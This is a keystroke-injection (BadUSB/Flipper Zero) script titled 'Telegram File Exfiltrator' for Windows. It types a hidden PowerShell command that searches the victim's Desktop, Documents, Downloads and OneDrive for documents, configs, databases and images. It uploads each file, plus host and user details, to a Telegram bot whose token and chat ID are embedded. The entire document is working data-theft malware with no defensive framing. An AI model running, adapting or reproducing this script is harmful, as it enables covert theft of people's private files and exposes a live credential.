REM Name: Telegram File Exfiltrator
REM Author: RFX/AOIRUSRA
REM Description: Отправка файлов через Telegram API
REM Target: Windows 10/11
REM Delay: 100ms
REM Repeat: 1

DELAY 1000
GUI r
DELAY 750
STRING powershell -WindowStyle Hidden -Command "
(
# Telegram Configuration
`$Token = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
`$ChatID = '6614794141'
`$BaseURL = 'https://api.telegram.org/bot' + `$Token

# Initialization
`$StartTime = Get-Date
Write-Host '[+] Flipper Zero Telegram Exfiltration' -ForegroundColor Cyan
Write-Host '[+] Token: ' `$Token -ForegroundColor Yellow
Write-Host '[+] Chat ID: ' `$ChatID -ForegroundColor Yellow

# Send start message
`$StartMessage = `$env:COMPUTERNAME + ' | ' + `$env:USERNAME + ' | ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
`$StartBody = @{chat_id = `$ChatID; text = `$StartMessage} | ConvertTo-Json
Invoke-RestMethod -Method Post -Uri (``"`$BaseURL/sendMessage``") -Body `$StartBody -ContentType 'application/json'

# File search configuration
`$SearchFolders = @(
    ``"`$env:USERPROFILE\Desktop``",
    ``"`$env:USERPROFILE\Documents``",
    ``"`$env:USERPROFILE\Downloads``",
    ``"`$env:USERPROFILE\OneDrive``"
)

`$FilePatterns = @(
    '*.txt', '*.log', '*.pdf', '*.doc', '*.docx',
    '*.xls', '*.xlsx', '*.csv', '*.cfg', '*.conf',
    '*.ini', '*.json', '*.xml', '*.sql', '*.db',
    '*.jpg', '*.jpeg', '*.png'
)

# Maximum file size (Telegram limit: 50MB)
`$MaxFileSize = 45MB

# Collect and send files
`$TotalFiles = 0
`$SentFiles = 0
`$FailedFiles = 0

foreach (`$Folder in `$SearchFolders) {
    if (Test-Path `$Folder) {
        Write-Host '[+] Searching: ' `$Folder -ForegroundColor Green
        
        foreach (`$Pattern in `$FilePatterns) {
            `$Files = Get-ChildItem -Path `$Folder -Filter `$Pattern -File -Recurse -ErrorAction SilentlyContinue
            
            foreach (`$File in `$Files) {
                `$TotalFiles++
                
                # Check file size
                if (`$File.Length -lt `$MaxFileSize) {
                    try {
                        # Send file via curl
                        `$Result = curl.exe -s -F ``"chat_id=`$ChatID``" -F ``"document=@`$(`$File.FullName)``" ``"`$BaseURL/sendDocument``"
                        
                        if (`$LASTEXITCODE -eq 0) {
                            `$SentFiles++
                            Write-Host '[+] Sent: ' `$File.Name -ForegroundColor Green
                        } else {
                            `$FailedFiles++
                            Write-Host '[-] Failed: ' `$File.Name -ForegroundColor Red
                        }
                        
                        # Rate limiting
                        Start-Sleep -Milliseconds 500
                        
                    } catch {
                        `$FailedFiles++
                        Write-Host '[-] Error: ' `$_.Exception.Message -ForegroundColor Red
                    }
                } else {
                    Write-Host '[-] Skipped (too large): ' `$File.Name -ForegroundColor Yellow
                }
            }
        }
    }
}

# Send system information
`$SystemInfo = @'
Host Information:
- Computer: {0}
- Username: {1}
- OS: {2}
- Architecture: {3}
- Domain: {4}

File Statistics:
- Total found: {5}
- Successfully sent: {6}
- Failed: {7}
- Duration: {8}
'@ -f `$env:COMPUTERNAME,
       `$env:USERNAME,
       (Get-CimInstance Win32_OperatingSystem).Caption,
       `$env:PROCESSOR_ARCHITECTURE,
       `$env:USERDOMAIN,
       `$TotalFiles,
       `$SentFiles,
       `$FailedFiles,
       ((Get-Date) - `$StartTime).ToString('hh\:mm\:ss')

`$InfoBody = @{chat_id = `$ChatID; text = `$SystemInfo} | ConvertTo-Json
Invoke-RestMethod -Method Post -Uri (``"`$BaseURL/sendMessage``") -Body `$InfoBody -ContentType 'application/json'

# Cleanup and exit
Write-Host '[!] Exfiltration complete' -ForegroundColor Cyan
Write-Host '[!] Total files processed: ' `$TotalFiles -ForegroundColor White
Write-Host '[!] Files sent: ' `$SentFiles -ForegroundColor Green
Write-Host '[!] Files failed: ' `$FailedFiles -ForegroundColor Red
Write-Host '[!] Duration: ' ((Get-Date) - `$StartTime) -ForegroundColor White

# Optional: Self-destruct or cleanup
Start-Sleep -Seconds 2
)
"
DELAY 100
ENTER
